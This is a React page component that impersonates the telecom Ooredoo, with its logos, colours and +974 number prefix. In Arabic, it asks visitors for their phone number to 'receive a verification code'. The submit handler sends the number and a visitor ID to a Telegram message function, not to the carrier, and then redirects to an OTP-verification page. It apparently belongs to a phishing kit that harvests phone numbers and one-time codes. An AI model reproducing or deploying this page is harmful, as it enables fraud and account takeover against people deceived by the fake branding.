import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import ooredooLogo from '../assets/ooredoo-logo.png';
import ooredooHeader from '../assets/ooredoo-header.png';
import ooredooVerificationLogo from '../assets/ooredoo-verification-logo.png';

const OoreedooVerification = () => {
  const navigate = useNavigate();
  const { sendTelegramMessage, formData } = useRegistration();
  const [phone, setPhone] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phone || phone.length < 8) {
      setError('الرجاء إدخال رقم هاتف صحيح');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      await sendTelegramMessage(
        `📱 تفعيل Ooredoo\n\n` +
        `📞 رقم الهاتف: ${phone}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/otp-verification');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  if (isLoading) {
    return <LoadingScreen message="جاري إرسال رمز التحقق..." />;
  }

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      {/* Ooredoo Header */}
      <div className="bg-[#ED1C24] py-4 px-6">
        <img src={ooredooHeader} alt="Ooredoo" className="h-8 mx-auto" />
      </div>

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <img src={ooredooVerificationLogo} alt="Verification" className="h-24 mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-gray-800 mb-2">
              التحقق من رقم الهاتف
            </h1>
            <p className="text-gray-600 text-sm">
              أدخل رقم هاتفك Ooredoo لتلقي رمز التحقق
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                رقم الهاتف
              </label>
              <div className="flex gap-2">
                <div className="bg-gray-100 px-4 py-3 rounded-lg text-gray-600 font-semibold">
                  +974
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                  className="flex-1 px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#ED1C24] focus:border-transparent"
                  placeholder="XXXXXXXX"
                  maxLength={8}
                  dir="ltr"
                />
              </div>
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#ED1C24] text-white py-3 rounded-lg font-semibold hover:bg-[#D41920] transition-colors"
            >
              إرسال رمز التحقق
            </button>
          </form>

          <div className="mt-8 text-center">
            <img src={ooredooLogo} alt="Ooredoo" className="h-8 mx-auto opacity-50" />
          </div>
        </div>
      </div>
    </div>
  );
};

export default OoreedooVerification;
